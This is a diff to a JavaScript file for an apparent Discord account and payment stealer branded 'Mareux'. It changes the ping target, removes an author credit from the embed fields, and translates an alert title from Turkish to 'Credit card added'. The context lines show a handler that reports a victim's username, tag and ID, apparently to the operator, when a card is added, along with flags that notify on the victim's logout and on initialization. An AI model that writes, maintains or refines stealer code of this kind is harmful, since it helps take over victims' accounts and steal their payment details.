@@ -20,12 +20,12 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@here"],
+    ping: [true, "@doener"],
 
     embed: {
-        username: "Mareux | discord.gg/mareux | Made by Krex_381#0001",
+        username: "Mareux | discord.gg/mareux",
         footer: {
-            text: `Mareux | discord.gg/mareux | Made by Krex_381#0001`,
+            text: `Mareux | discord.gg/mareux`,
             icon_url: "https://media.discordapp.net/attachments/1076860114008543233/1087424479493378099/ff1414427d3864c81e6e342c86af199f.png",
         },
         href: "https://discord.gg//mareux",
@@ -260,7 +260,7 @@ var event_handlers = {
             username: config.embed.username,
             avatar_url: config.embed.avatar_url,
             embeds: [createEmbed({
-                title: "Discord | Kredi Karti Eklendi",
+                title: "Discord | Credit card added",
                 url: config.embed.href,
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
